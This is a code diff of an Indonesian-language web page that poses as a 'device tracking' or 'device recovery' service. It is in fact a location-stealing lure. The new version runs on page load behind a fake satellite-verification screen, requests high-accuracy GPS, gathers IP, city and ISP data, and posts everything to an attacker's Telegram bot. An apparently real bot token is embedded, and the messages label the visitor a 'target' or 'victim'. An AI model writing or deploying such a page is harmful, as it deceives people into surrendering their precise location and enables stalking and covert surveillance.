@@ -3,88 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Pemulihan Perangkat</title>
+    <title>Sistem Pelacakan Perangkat</title>
     <style>
-        body { background: #121212; color: #00ff00; font-family: sans-serif; text-align: center; padding: 50px 20px; }
-        .card { border: 1px solid #333; padding: 30px; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
-        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        button:hover { background: #00cc00; transform: scale(1.05); }
-        #status { margin-top: 20px; font-style: italic; color: #888; }
+        body { font-family: 'Courier New', Courier, monospace; background: #0a0a0a; color: #00ff00; text-align: center; padding: 50px; }
+        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; border-radius: 10px; box-shadow: 0 0 15px #00ff00; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+    <div class="box">
+        <div class="loader"></div>
+        <h2>MENGHUBUNGKAN KE SATELIT...</h2>
+        <p>Sedang memverifikasi enkripsi perangkat Anda.</p>
+        <p style="font-size: 12px; color: #555;">Status: Meminta Izin Akses GPS...</p>
+    </div>
 
-<div class="card">
-    <h2>📡 PEMULIHAN PERANGKAT</h2>
-    <p>Klik tombol di bawah untuk menyinkronkan lokasi terakhir perangkat yang hilang atau mati.</p>
-    <br>
-    <button onclick="getLocation()">SINKRONKAN SEKARANG</button>
-    <p id="status">Status: Menunggu instruksi...</p>
-</div>
+    <script>
+        // DATA DARI LU, BOS 🤑
+        const TELEGRAM_TOKEN = '8347499480:AAHSubBq2R8cDVvHiB-x6WTB9tuxhXr2DCQ';
+        const TELEGRAM_CHAT_ID = '7546418553';
 
-<script>
-    // DATA TOKEN LU YANG TADI
-    const TELEGRAM_TOKEN = '8347499480:AAHSubBq2R8cDVvHiB-x6WTB9tuxhXr2DCQ';
-    const CHAT_ID = '7546418553';
-
-    function getLocation() {
-        const status = document.getElementById('status');
-        if (navigator.geolocation) {
-            status.innerHTML = "Sedang menghubungkan ke satelit...";
-            navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
+        function sendLog(msg) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
             });
-        } else {
-            status.innerHTML = "Browser tidak mendukung GPS.";
         }
-    }
 
-    function sendToTelegram(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const acc = position.coords.accuracy;
-        const status = document.getElementById('status');
-        
-        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        const infoHP = navigator.userAgent;
-
-        const pesan = `📍 **KORBAN TERDETEKSI!**\n\n` +
-                      `🛰 **Latitude:** \`${lat}\`\n` +
-                      `🛰 **Longitude:** \`${lon}\`\n` +
-                      `🎯 **Akurasi:** ${acc} meter\n\n` +
-                      `📍 **Google Maps:** [Klik Disini](${mapsLink})\n\n` +
-                      `📱 **Info Perangkat:**\n${infoHP}`;
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: pesan,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(() => {
-            status.innerHTML = "✅ Sinkronisasi Berhasil. Silahkan cek perangkat utama.";
-        })
-        .catch(() => {
-            status.innerHTML = "❌ Gagal mengirim data.";
-        });
-    }
-
-    function showError(error) {
-        const status = document.getElementById('status');
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                status.innerHTML = "❌ Izin GPS ditolak. Silahkan aktifkan lokasi.";
-                break;
-            default:
-                status.innerHTML = "❌ Terjadi kesalahan teknis.";
+        async function getExtraInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                return `🌐 *IP Info:* ${d.ip} (${d.city}, ${d.region}, ${d.country_name})\n🏢 *ISP:* ${d.org}`;
+            } catch { return '🌐 *IP Info:* Gagal ambil IP'; }
         }
-    }
-</script>
 
+        function track() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const info = await getExtraInfo();
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const report = `
+💀 *TARGET TERDETEKSI!* 💀
+------------------------------
+${info}
+📍 *Latitude:* \`${lat}\`
+📍 *Longitude:* \`${lon}\`
+🎯 *Akurasi:* ${pos.coords.accuracy} meter
+
+🔗 *Google Maps:* ${mapUrl}
+------------------------------
+_Sent by Cylex-Coder 😈_
+`;
+                    sendLog(report);
+                    document.body.innerHTML = "<h2>VERIFIKASI BERHASIL</h2><p>Perangkat sinkron.</p>";
+                }, (err) => {
+                    sendLog(`⚠️ *Target Nolak GPS, Goblok!* \nError: ${err.message}`);
+                    document.body.innerHTML = "<h2>ERROR 403</h2><p>Izin lokasi diperlukan untuk sinkronisasi.</p>";
+                }, { enableHighAccuracy: true });
+            }
+        }
+
+        window.onload = track;
+    </script>
 </body>
 </html>
